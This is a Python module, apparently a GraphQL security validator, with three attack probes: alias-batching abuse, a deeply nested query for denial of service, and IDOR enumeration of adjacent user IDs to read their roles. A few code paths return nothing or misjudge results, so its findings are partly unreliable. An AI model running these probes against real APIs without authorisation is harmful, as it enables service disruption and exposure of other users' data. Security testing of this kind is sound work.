
# modules/pipeline/validators/graphql_validator.py
# Part B: GraphQL Attack Vectors

import requests
import time
from typing import Dict, List, Union

class GraphQLAttackVector:
    def __init__(self, api_url: str):
        self.api_url = api_url
        self.session = requests.Session()  # Maintain auth context

    def batch_query_abuse(self) -> Dict[str, Union[bool, str]]:
        """Construct 500 aliased queries in one request"""
        # Use standard query aliasing on a simple meta-field for a more robust test.
        aliases = " ".join([f"q{i}: __typename" for i in range(500)])
        query = f"query {{ {aliases} }}"
        payload = {"query": query}
        try:
            response = self.session.post(self.api_url, json=payload, timeout=10)
            if response.status_code == 200 and "data" in response.json():
                data = response.json().get("data", {})
                # If all 500 aliased queries returned data, it's a bypass.
                if data and len(data.keys()) >= 500:
                    return {"batch_query_abuse": True}
                return {"batch_query_abuse": False}
        except Exception as e:
            return {"batch_query_abuse": f"failed: {str(e)}"}

    def nested_query_dos(self) -> Dict[str, Union[bool, float]]:
        """Generate 16-layer nested query and measure time"""
        nested_query = "query { " + "a { " * 16 + "id" + " }" * 16 + " }"
        try:
            start_time = time.time()
            response = self.session.post(self.api_url, json={"query": nested_query}, timeout=10)
            duration = time.time() - start_time
            if "errors" in response.json() or duration > 2.0:  # Threshold for DoS
                return {"nested_query_dos": f"triggered ({duration:.2f}s)"}
        except Exception as e:
            return {"nested_query_dos": f"error: {str(e)}"}

    def idor_validation(self, auth_cookie: str) -> Dict[str, List[str]]:
        """Test IDOR using authenticated session"""
        # Example: Find current user's id first
        me_query = "query { me { id } }"
        try:
            response = self.session.post(self.api_url, json={"query": me_query})
            current_id = response.json()['data']['me']['id']
            
            ids_to_test = [str(int(current_id) + delta) for delta in range(-5, 6) if delta != 0]
            leaked_ids = []
            for test_id in ids_to_test:
                query = f"query {{ user(id: {test_id}) {{ id, role }} }}"
                resp = self.session.post(self.api_url, json={"query": query})
                if "data" in resp.json():
                    leaked_ids.append(test_id)
            return {"idor_validation": leaked_ids}
        except Exception as e:
            return {"idor_validation": []}
